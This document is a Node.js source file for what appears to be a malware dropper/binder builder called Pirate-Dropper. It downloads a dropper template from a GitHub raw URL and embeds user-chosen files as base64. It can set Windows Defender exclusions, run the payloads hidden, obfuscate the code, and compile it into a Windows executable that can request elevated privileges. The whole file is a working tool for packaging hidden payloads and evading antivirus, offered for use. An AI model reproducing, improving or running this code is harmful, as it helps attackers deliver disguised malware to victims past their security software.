const JavaScriptObfuscator = require('javascript-obfuscator');
const fs = require('fs');
const https = require('https');
const prompt = require('prompt-sync')();
const exe = require("@angablue/exe");
const path = require('path');

async function getCode() {
    try {
        const res = await new Promise((resolve, reject) => {
            https.get("https://raw.githubusercontent.com/Pirate-Devs/Pirate-Dropper/main/src/static/dropper.js", (res) => {
                let data = '';
                res.on('data', (chunk) => {
                    data += chunk;
                });
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        resolve(data);
                    } else {
                        reject(new Error('Failed to retrieve online code'));
                    }
                });
            }).on('error', (err) => {
                reject(err);
            });
        });
        return res;
    } catch (error) {
        const workingDir = process.cwd();
        const fileLocation = path.join(workingDir, "src/static/dropper.js");
        return fs.readFileSync(fileLocation, "utf8");
    }
}

async function replace_defender_exclusions(code, defender_exclusions) {
    if (defender_exclusions) {
        var to_replace = 'var exclusions = false;';
        var new_code = 'var exclusions = true;';
        code = code.replace(to_replace, new_code);
    }
    return code;
}

async function main() {
    var ammount_of_files = prompt("Enter the ammount of files you want to drop/bind: ");

    if (isNaN(ammount_of_files)) {
        console.log("Invalid input, please enter a number.");
        return;
    }

    var processes = [];
    for (var i = 0; i < ammount_of_files; i++) {
        var file_location = prompt("Enter the file location: ");
        var new_console = prompt("Do you want to run in a new console? (best if you have a console app and you want to keep the same console.) (y/n): ");
        var hidden = prompt("Do you want to run the process hidden? (best to use with console off so it doesn't mess anything up) (y/n): ");

        new_console = new_console == "y" ? true : false;
        hidden = hidden == "y" ? true : false;

        var process_ext = file_location.split('.').pop();
        var process_code = fs.readFileSync(file_location, "base64");
        processes.push({ process_ext, process_code, new_console, hidden });
    }

    var defender_exclusions = prompt("Do you want to add defender exclusions? (y/n): ");
    defender_exclusions = defender_exclusions == "y" ? true : false;

    var to_replace = '[{process_ext:"key1", process_code:"BASE64DATA", new_console: false, hidden: false}]';

    var code = await getCode();

    code = code.replace(to_replace, JSON.stringify(processes));
    code = await replace_defender_exclusions(code, defender_exclusions);

    var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
        compact: true,
        simplify: true,
        target: 'node',
        unicodeEscapeSequence: true
    });

    fs.writeFileSync("out.js", obfuscationResult.getObfuscatedCode(), "utf8");
    //fs.writeFileSync("out.js", code, "utf8");
    build_binary("out.js");
}

async function build_binary(file_path) {
    var file = `./${file_path}`;
    var icon_location = prompt("Enter the icon location or just press enter for none: ");
    var output_filename = prompt("Enter the output filename: ");
    output_filename += ".exe";

    var admin_exec = prompt("Do you want to run as admin? (y/n): ");
    var admin = false;
    if (admin_exec == "y") {
        admin = true;
    }

    var target = "latest-win-x64"

    var build = exe({
        entry: file,
        out: output_filename,
        pkg: ["-C", "GZip"],
        version: "1.0.0",
        //only define icon if it's not empty
        icon: icon_location == "" ? undefined : icon_location,
        target: target,
        executionLevel: admin ? "highestAvailable" : "asInvoker"
    });

    build.then(() => {
        console.log("Build successful!");
    }).catch((err) => {
        console.error(err);
    });
}

main();